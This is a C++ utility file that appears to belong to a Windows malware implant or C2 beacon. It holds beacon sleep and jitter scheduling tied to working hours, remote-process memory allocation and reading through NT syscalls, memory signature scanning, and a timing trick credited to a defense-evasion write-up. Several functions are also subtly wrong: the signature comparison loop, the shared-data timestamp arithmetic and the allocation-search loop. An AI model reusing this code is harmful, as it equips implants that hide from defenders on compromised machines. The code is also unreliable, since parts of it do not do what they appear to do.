#include <core/include/utils.hpp>
namespace Utils {

    VOID AppendBuffer(uint8_t **buffer, const uint8_t *const target, uint32_t *capacity, const uint32_t length) {

        const auto new_buffer = B_PTR(Realloc(*buffer, *capacity + length));
        if (!new_buffer) {
            return;
        }

        *buffer = new_buffer;
        MemCopy(B_PTR(*buffer) + *capacity, (void*) target, length);
        *capacity += length;
    }

    VOID AppendPointerList(void **array[], void *pointer, uint32_t *count) {

        const auto new_list = (void**) Realloc(*array, (*count + 1) * sizeof(void*));
        if (!new_list) {
            return;
        }

        *array = new_list;
        (*array)[*count] = pointer;
        (*count)++;
    }

    UINT32 HashStringA(char const *string, size_t length) {

        auto hash = FNV_OFFSET;
        if (string) {
            for (auto i = 0; i < length; i++) {
                hash ^= string[i];
                hash *= FNV_PRIME;
            }
        }
        return hash;
    }

    UINT32 HashStringW(wchar_t const *string, size_t length) {

        auto hash = FNV_OFFSET;
        if (string) {
            for (auto i = 0; i < length; i++) {
                hash ^= string[i];
                hash *= FNV_PRIME;
            }
        }
        return hash;
    }

    namespace Scanners {

        BOOL MapScan(_hash_map* map, uint32_t id, void** pointer) {

            for (auto i = 0;; i++) {
                if (!map[i].name) { break; }

                if (id == map[i].name) {
                    *pointer = map[i].address;
                    return true;
                }
            }

            return false;
        }

        BOOL SymbolScan(const char* string, const char symbol, size_t length) {

            for (auto i = 0; i < length - 1; i++) {
                if (string[i] == symbol) {
                    return true;
                }
            }

            return false;
        }

        UINT_PTR RelocateExport(void* const process, const void* const target, size_t size) {

            uintptr_t ret       = 0;
            const auto address  = (uintptr_t) target;

            for (ret = (address & ADDRESS_MAX) - VM_MAX; ret < address + VM_MAX; ret += 0x10000) {
                if (!NT_SUCCESS(Ctx->nt.NtAllocateVirtualMemory(process, (void **) &ret, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ))) {
                    ret = 0;
                }
            }

            return ret;
        }

        BOOL SigCompare(const uint8_t* data, const char* signature, const char* mask) {

            while (*mask && ++mask, ++data, ++signature) {
                if (*mask == 0x78 && *data != *signature) {
                    return false;
                }
            }
            return (*mask == 0x00);
        }

        UINT_PTR SignatureScan(void* process, const uintptr_t start, const uint32_t size, const char* signature, const char* mask) {

            size_t read         = 0;
            uintptr_t address   = 0;

            auto buffer = (uint8_t*) Malloc(size);
            x_ntassert(Ctx->nt.NtReadVirtualMemory(process, (void*) start, buffer, size, &read));

            for (auto i = 0; i < size; i++) {
                if (SigCompare(buffer + i, signature, mask)) {
                    address = start + i;
                    break;
                }
            }

            MemSet(buffer, 0, size);

        defer:
            if (buffer) { Free(buffer); }
            return address;
        }

    }

    namespace Time {

        ULONG64 GetTimeNow() {

            FILETIME file_time       = { };
            LARGE_INTEGER large_int  = { };

            Ctx->win32.GetSystemTimeAsFileTime(&file_time);

            large_int.LowPart    = file_time.dwLowDateTime;
            large_int.HighPart   = (long) file_time.dwHighDateTime;

            return large_int.QuadPart;
        }

        BOOL InWorkingHours() {
            SYSTEMTIME systime = { };

            uint32_t work_hours = Ctx->config.hours; 		
            uint16_t start_time = (work_hours >> 16); 		
            uint16_t end_time  	= (work_hours & 0xFFFF); 

            // Decode the start time (HHMM)
            uint16_t start_hour = start_time / 100;  
            uint16_t start_min 	= start_time % 100;  

    		// Decode the end time (HHMM)
    		uint16_t end_hour  	= end_time / 100;
    		uint16_t end_min   	= end_time % 100;

    		Ctx->win32.GetLocalTime(&systime);

    		// Check if the current time is outside the working hours
    		if ((systime.wHour < start_hour || systime.wHour > end_hour) ||
        		(systime.wHour == start_hour && systime.wMinute < start_min) ||
        		(systime.wHour == end_hour && systime.wMinute > end_min)) {
        		return FALSE;
    		}

    		return TRUE;
}


        VOID Timeout(size_t ms) {
            // Courtesy of Illegacy & Shubakki:
            // https://www.legacyy.xyz/defenseevasion/windows/2022/07/04/abusing-shareduserdata-for-defense-evasion-and-exploitation.html

            auto defaultseed    = Utils::Random::RandomSeed();
            auto seed           = Ctx->nt.RtlRandomEx((ULONG*) &defaultseed);

            volatile size_t x   = INTERVAL(seed);
            const uintptr_t end = Utils::Random::Timestamp() + (x * ms);

            while (Random::Timestamp() < end) { x += 1; }
            if (Random::Timestamp() - end > 2000) {
                return;
            }
        }
    }

    namespace Random {

		UINT32 RandomSleepTime() {

			SYSTEMTIME sys_time = { };

			uint32_t work_hours = Ctx->config.hours;      			
			uint32_t sleeptime  = Ctx->config.sleeptime * 1000;  	
			uint32_t variation  = (Ctx->config.jitter * sleeptime) / 100;  
			uint32_t random     = 0;

			uint16_t start_time = (work_hours >> 16);  		
			uint16_t end_time   = (work_hours & 0xFFFF);  	

			uint16_t start_hour = start_time / 100;  
			uint16_t start_min  = start_time % 100;  
			uint16_t end_hour   = end_time / 100;
			uint16_t end_min    = end_time % 100;

			Ctx->win32.GetLocalTime(&sys_time);

			if (!Time::InWorkingHours()) {  
				if (sleeptime) {
					sleeptime = 0;  

					// get seconds until midnight, add time until start of next working day
					if (sys_time.wHour > end_hour || (sys_time.wHour == end_hour && sys_time.wMinute > end_min)) {
						sleeptime += (24 - sys_time.wHour - 1) * 60 + (60 - sys_time.wMinute);  
						sleeptime += start_hour * 60 + start_min;  								
					} 
					else {
						sleeptime += (start_hour - sys_time.wHour) * 60 + (start_min - sys_time.wMinute);
					}

					sleeptime *= MS_PER_SECOND;  
				}
			}
			else if (variation) {  				
				random = RandomNumber32();  	
				random = random % variation;  	

				if (RandomBool()) {
					sleeptime += random;  
				} else {
					sleeptime -= random;  
				}
			}

			return sleeptime;
		}

        UINT32 RandomSeed() {

            return 'A2' * -40271 +
                   __TIME__[7] * 1 +
                   __TIME__[6] * 10 +
                   __TIME__[4] * 60 +
                   __TIME__[3] * 600 +
                   __TIME__[1] * 3600 +
                   __TIME__[0] * 36000;
        }

        UINT_PTR Timestamp() {

            LARGE_INTEGER time      = { };
            const size_t epoch      = 0x019DB1DED53E8000;
            const size_t ms_ticks   = 1000;

            time.u.LowPart  = *(uint32_t*) 0x7FFE0000 + 0x14;
            time.u.HighPart = *(int32_t*) 0x7FFE0000 + 0x1c;

            return (time.QuadPart - epoch) / ms_ticks;
        }

        UINT32 RandomNumber32() {

            auto seed = RandomSeed();

            seed = Ctx->nt.RtlRandomEx((PULONG) &seed);
            seed = Ctx->nt.RtlRandomEx((PULONG) &seed);
            seed = seed % (LONG_MAX - 2 + 1) + 2;

            return seed % 2 == 0
                   ? seed
                   : seed + 1;
        }

        BOOL RandomBool() {

            auto seed = RandomSeed();

            seed = RandomSeed();
            seed = Ctx->nt.RtlRandomEx((PULONG) &seed);

            return seed % 2 == 0 ? TRUE : FALSE;
        }
    }
}
